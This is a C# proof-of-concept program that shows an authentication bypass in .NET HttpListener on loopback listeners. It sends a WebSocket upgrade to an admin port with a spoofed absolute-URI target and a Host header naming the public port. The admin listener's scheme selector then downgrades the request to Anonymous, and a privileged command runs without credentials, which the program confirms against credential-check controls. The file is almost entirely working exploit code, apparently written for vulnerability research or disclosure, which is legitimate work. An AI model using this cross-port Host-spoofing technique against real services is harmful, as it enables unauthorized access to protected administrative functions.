using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class Program
{
    private const string ExpectedUser = "cross-port-admin";
    private const string ExpectedPassword = "correct-cross-port-password";
    private const string PrivilegedCommand = "EXECUTE_CROSS_PORT_ADMIN_CHANGE";
    private const string CommandSentinel = "CROSS_PORT_ADMIN_WS_COMMAND_EXECUTED_6c21";
    private static readonly string SideEffectPath =
        Path.Combine(Path.GetTempPath(), "httplistener-cross-port-ultimate-6c21.txt");

    record Obs(
        string Name,
        string FirstLine,
        bool BasicChallenge,
        bool AdminContext,
        AuthenticationSchemes Selected,
        string UserHostName,
        string UrlAuthority,
        bool ValidationRan,
        bool ValidationPassed,
        bool WsUpgrade,
        bool CommandExecuted,
        bool SideEffect);

    static int FreePort()
    {
        using var l = new TcpListener(IPAddress.Loopback, 0);
        l.Start();
        int p = ((IPEndPoint)l.LocalEndpoint).Port;
        l.Stop();
        return p;
    }

    static void Require(bool condition, string message)
    {
        if (!condition) throw new Exception("ASSERTION_FAILED: " + message);
    }

    static string Basic(string u, string p) =>
        Convert.ToBase64String(Encoding.ASCII.GetBytes(u + ":" + p));

    static byte[] BuildMaskedTextFrame(string text)
    {
        byte[] payload = Encoding.UTF8.GetBytes(text);
        if (payload.Length > 125) throw new InvalidOperationException();

        byte[] mask = { 0x31, 0x42, 0x53, 0x64 };
        byte[] frame = new byte[6 + payload.Length];
        frame[0] = 0x81;
        frame[1] = (byte)(0x80 | payload.Length);
        Array.Copy(mask, 0, frame, 2, 4);

        for (int i = 0; i < payload.Length; i++)
            frame[6 + i] = (byte)(payload[i] ^ mask[i % 4]);

        return frame;
    }

    static async Task<byte[]> ReadHeaders(NetworkStream ns)
    {
        using var ms = new MemoryStream();
        byte[] one = new byte[1];
        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
        int state = 0;

        while (true)
        {
            int n = await ns.ReadAsync(one, cts.Token);
            if (n == 0) break;

            ms.WriteByte(one[0]);
            state = (state, one[0]) switch
            {
                (0, 13) => 1,
                (1, 10) => 2,
                (2, 13) => 3,
                (3, 10) => 4,
                (_, 13) => 1,
                _ => 0
            };

            if (state == 4) break;
        }

        return ms.ToArray();
    }

    static async Task<byte[]> ReadRest(NetworkStream ns)
    {
        using var ms = new MemoryStream();
        byte[] b = new byte[4096];
        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));

        try
        {
            while (true)
            {
                int n = await ns.ReadAsync(b, cts.Token);
                if (n == 0) break;

                await ms.WriteAsync(b.AsMemory(0, n), cts.Token);

                if (!ns.DataAvailable)
                    await Task.Delay(100, cts.Token);

                if (ms.Length > 0 && !ns.DataAvailable)
                    break;
            }
        }
        catch (OperationCanceledException) { }

        return ms.ToArray();
    }

    static async Task<Obs> Run(
        string name,
        int publicPort,
        int adminPort,
        string? authorizationValue,
        bool crossPortAttack)
    {
        try { File.Delete(SideEffectPath); } catch { }

        using var publicListener = new HttpListener();
        using var adminListener = new HttpListener();

        publicListener.Prefixes.Add($"http://app.test:{publicPort}/public/");
        adminListener.Prefixes.Add($"http://app.test:{adminPort}/admin/ws/");

        publicListener.AuthenticationSchemes = AuthenticationSchemes.Anonymous;

        AuthenticationSchemes selected = AuthenticationSchemes.None;
        string selectorUserHost = "<not-called>";
        string selectorUrlAuthority = "<not-called>";

        adminListener.AuthenticationSchemes = AuthenticationSchemes.None;
        adminListener.Realm = "cross-port-ultimate";
        adminListener.AuthenticationSchemeSelectorDelegate = request =>
        {
            selectorUserHost = request.UserHostName ?? "<null>";
            selectorUrlAuthority = request.Url?.Authority ?? "<null>";

            int colon = selectorUserHost.LastIndexOf(':');
            int seenPort = -1;
            if (colon >= 0)
                int.TryParse(selectorUserHost[(colon + 1)..], out seenPort);

            selected = seenPort == publicPort
                ? AuthenticationSchemes.Anonymous
                : AuthenticationSchemes.Basic;

            Console.WriteLine(
                $"SELECTOR case={name} UserHostName={selectorUserHost} UrlAuthority={selectorUrlAuthority} SeenPort={seenPort} PublicPort={publicPort} AdminPort={adminPort} Selected={selected}");

            return selected;
        };

        publicListener.Start();
        adminListener.Start();

        Task<HttpListenerContext> publicTask = publicListener.GetContextAsync();
        Task<HttpListenerContext> adminTask = adminListener.GetContextAsync();

        using var client = new TcpClient();
        await client.ConnectAsync(IPAddress.Loopback, adminPort);
        using NetworkStream ns = client.GetStream();

        string target = crossPortAttack
            ? $"http://app.test:{publicPort}/admin/ws/control"
            : "/admin/ws/control";

        string host = crossPortAttack
            ? $"app.test:{publicPort}"
            : $"app.test:{adminPort}";

        var raw = new StringBuilder();
        raw.Append($"GET {target} HTTP/1.1\r\n");
        raw.Append($"Host: {host}\r\n");
        if (authorizationValue != null)
            raw.Append($"Authorization: Basic {authorizationValue}\r\n");
        raw.Append("Upgrade: websocket\r\n");
        raw.Append("Connection: Upgrade\r\n");
        raw.Append("Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n");
        raw.Append("Sec-WebSocket-Version: 13\r\n");
        raw.Append("\r\n");

        Console.WriteLine(
            $"RAW case={name} connectedAdminPort={adminPort} requestTarget={target} Host={host} Authorization={(authorizationValue is null ? "<none>" : "<Basic-present>")}");

        await ns.WriteAsync(Encoding.ASCII.GetBytes(raw.ToString()));
        await ns.FlushAsync();

        bool adminContext = false;
        bool validationRan = false;
        bool validationPassed = false;

        Task serverTask = Task.Run(async () =>
        {
            Task first = await Task.WhenAny(publicTask, adminTask, Task.Delay(5000));

            if (first == adminTask && adminTask.IsCompletedSuccessfully)
            {
                adminContext = true;
                HttpListenerContext ctx = await adminTask;

                Console.WriteLine(
                    $"ADMIN_CONTEXT case={name} LocalPort={ctx.Request.LocalEndPoint.Port} UserHostName={ctx.Request.UserHostName} UrlAuthority={ctx.Request.Url?.Authority} User={(ctx.User is null ? "ANONYMOUS" : "AUTHENTICATED")} IsWebSocket={ctx.Request.IsWebSocketRequest}");

                if (ctx.User?.Identity is HttpListenerBasicIdentity basic)
                {
                    validationRan = true;
                    validationPassed =
                        basic.Name == ExpectedUser &&
                        basic.Password == ExpectedPassword;

                    Console.WriteLine(
                        $"APP_CREDENTIAL_VALIDATION case={name} username={basic.Name} passed={validationPassed}");

                    if (!validationPassed)
                    {
                        byte[] denied = Encoding.ASCII.GetBytes("INVALID_ADMIN_CREDENTIALS\n");
                        ctx.Response.StatusCode = 403;
                        ctx.Response.ContentLength64 = denied.Length;
                        await ctx.Response.OutputStream.WriteAsync(denied);
                        ctx.Response.Close();
                        return;
                    }
                }

                if (!ctx.Request.IsWebSocketRequest)
                {
                    ctx.Response.StatusCode = 400;
                    ctx.Response.Close();
                    return;
                }

                HttpListenerWebSocketContext wsCtx = await ctx.AcceptWebSocketAsync(null);

                byte[] receive = new byte[1024];
                WebSocketReceiveResult rr = await wsCtx.WebSocket.ReceiveAsync(
                    new ArraySegment<byte>(receive),
                    CancellationToken.None);

                string command = Encoding.UTF8.GetString(receive, 0, rr.Count);
                Console.WriteLine($"ADMIN_WS_COMMAND case={name} command={command}");

                string reply = "COMMAND_REJECTED";
                if (command == PrivilegedCommand)
                {
                    File.WriteAllText(
                        SideEffectPath,
                        "CROSS_PORT_ULTIMATE_PROTECTED_OPERATION_EXECUTED");

                    reply = CommandSentinel;
                }

                byte[] replyBytes = Encoding.UTF8.GetBytes(reply);
                await wsCtx.WebSocket.SendAsync(
                    new ArraySegment<byte>(replyBytes),
                    WebSocketMessageType.Text,
                    true,
                    CancellationToken.None);

                await wsCtx.WebSocket.CloseOutputAsync(
                    WebSocketCloseStatus.NormalClosure,
                    "done",
                    CancellationToken.None);
            }
        });

        byte[] headers = await ReadHeaders(ns);
        string headerText = Encoding.ASCII.GetString(headers);
        string firstLine =
            headerText.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None)[0];

        bool basicChallenge =
            headerText.Contains("WWW-Authenticate: Basic", StringComparison.OrdinalIgnoreCase);
        bool wsUpgrade = firstLine.Contains("101", StringComparison.Ordinal);

        if (wsUpgrade)
        {
            byte[] frame = BuildMaskedTextFrame(PrivilegedCommand);
            await ns.WriteAsync(frame);
            await ns.FlushAsync();
        }

        byte[] rest = await ReadRest(ns);
        string restAscii = Encoding.ASCII.GetString(rest);

        bool commandExecuted =
            restAscii.Contains(CommandSentinel, StringComparison.Ordinal);
        bool sideEffect = File.Exists(SideEffectPath);

        await Task.WhenAny(serverTask, Task.Delay(1500));

        Console.WriteLine(
            $"RESULT case={name} first={firstLine} basicChallenge={basicChallenge} adminContext={adminContext} selected={selected} selectorUserHost={selectorUserHost} selectorUrlAuthority={selectorUrlAuthority} validationRan={validationRan} validationPassed={validationPassed} wsUpgrade={wsUpgrade} commandExecuted={commandExecuted} sideEffect={sideEffect}");

        publicListener.Close();
        adminListener.Close();

        return new Obs(
            name,
            firstLine,
            basicChallenge,
            adminContext,
            selected,
            selectorUserHost,
            selectorUrlAuthority,
            validationRan,
            validationPassed,
            wsUpgrade,
            commandExecuted,
            sideEffect);
    }

    static async Task Main()
    {
        Console.WriteLine($"FRAMEWORK={RuntimeInformation.FrameworkDescription}");
        Console.WriteLine($"OS={RuntimeInformation.OSDescription}");

        int publicPort = FreePort();
        int adminPort = FreePort();
        while (adminPort == publicPort)
            adminPort = FreePort();

        Obs noCredentials = await Run(
            "ADMIN_NO_CREDENTIALS",
            publicPort,
            adminPort,
            authorizationValue: null,
            crossPortAttack: false);

        Obs wrongCredentials = await Run(
            "ADMIN_WRONG_CREDENTIALS",
            publicPort,
            adminPort,
            Basic("wrong", "wrong"),
            crossPortAttack: false);

        Obs correctCredentials = await Run(
            "ADMIN_CORRECT_CREDENTIALS",
            publicPort,
            adminPort,
            Basic(ExpectedUser, ExpectedPassword),
            crossPortAttack: false);

        Obs attack = await Run(
            "CROSS_PORT_NO_CREDENTIALS_ATTACK",
            publicPort,
            adminPort,
            authorizationValue: null,
            crossPortAttack: true);

        Require(noCredentials.FirstLine.Contains("401"),
            "admin WebSocket without credentials must be 401");
        Require(noCredentials.BasicChallenge &&
                noCredentials.Selected == AuthenticationSchemes.Basic,
            "admin WebSocket without credentials must select Basic");
        Require(!noCredentials.AdminContext &&
                !noCredentials.WsUpgrade &&
                !noCredentials.CommandExecuted &&
                !noCredentials.SideEffect,
            "admin no-credential control must not reach protected channel");

        Require(wrongCredentials.FirstLine.Contains("403"),
            "wrong Basic credentials must be rejected");
        Require(wrongCredentials.AdminContext &&
                wrongCredentials.ValidationRan &&
                !wrongCredentials.ValidationPassed,
            "wrong credentials must reach and fail independent validation");
        Require(!wrongCredentials.WsUpgrade &&
                !wrongCredentials.CommandExecuted &&
                !wrongCredentials.SideEffect,
            "wrong credentials must not establish protected channel");

        Require(correctCredentials.FirstLine.Contains("101"),
            "correct Basic credentials must establish protected WebSocket");
        Require(correctCredentials.AdminContext &&
                correctCredentials.ValidationRan &&
                correctCredentials.ValidationPassed,
            "correct credentials must pass independent validation");
        Require(correctCredentials.WsUpgrade &&
                correctCredentials.CommandExecuted &&
                correctCredentials.SideEffect,
            "valid credential control must execute protected command");

        Require(attack.FirstLine.Contains("101"),
            "no-credential cross-port attack must establish protected WebSocket");
        Require(!attack.BasicChallenge,
            "cross-port attack must omit Basic challenge");
        Require(attack.AdminContext,
            "physical admin-port request must reach admin listener");
        Require(attack.Selected == AuthenticationSchemes.Anonymous,
            "cross-port selector must downgrade request to Anonymous");
        Require(attack.UserHostName.EndsWith($":{publicPort}", StringComparison.Ordinal),
            "selector must observe public port authority");
        Require(attack.UrlAuthority.EndsWith($":{adminPort}", StringComparison.Ordinal),
            "canonical Url authority must identify admin port");
        Require(!attack.ValidationRan,
            "no-credential attack must skip Basic credential-validation path");
        Require(attack.WsUpgrade &&
                attack.CommandExecuted &&
                attack.SideEffect,
            "no-credential attack must execute operation wrong credentials cannot execute");

        Require(File.ReadAllText(SideEffectPath) ==
                "CROSS_PORT_ULTIMATE_PROTECTED_OPERATION_EXECUTED",
            "protected operation side effect must contain expected marker");

        Console.WriteLine($"PUBLIC_PORT={publicPort}");
        Console.WriteLine($"ADMIN_PORT={adminPort}");
        Console.WriteLine($"SIDE_EFFECT_PATH={SideEffectPath}");
        Console.WriteLine(
            "CROSS_PORT_ULTIMATE_CREDENTIAL_WEBSOCKET_AUTH_BYPASS=CONFIRMED");
    }
}
